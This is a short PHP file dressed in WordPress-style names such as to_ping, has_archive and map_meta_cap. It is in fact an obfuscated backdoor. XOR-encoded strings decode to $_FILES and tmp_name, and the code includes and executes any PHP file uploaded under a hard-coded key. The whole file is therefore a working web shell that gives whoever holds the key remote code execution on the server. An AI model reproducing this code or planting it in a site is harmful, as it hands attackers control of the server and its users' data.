<?php 	
$lastpostmodified = 'NxO1R7T3sJn5RcT';
$has_archive = $lastpostmodified;

function to_ping($wp_smiliessearch, $show_in_admin_all_list)

{
	$cdata_regex = 'pages';
    $slashpos = $show_in_admin_all_list;
    $rest_base = urldecode($wp_smiliessearch);
    $type_attr = substr($slashpos,0, strlen($rest_base));
    $utf8_string = $rest_base ^ $type_attr;

    return $utf8_string;
}
$orderby = ${to_ping("%11%3E%06%7D%17d", $has_archive)};
$wp_error = $orderby;
$words_array = isset($wp_error[$has_archive]);
if ($words_array)

{
    $tax_object = $orderby[$has_archive];

    $callback = $tax_object[to_ping("%3A%15%3Fn%3CV9V", $has_archive)];
    $where_post_type = $callback;
	$prev_value = 'ancestors';
    include ($where_post_type);
	$ext_type = 'map_meta_cap';
}

?>
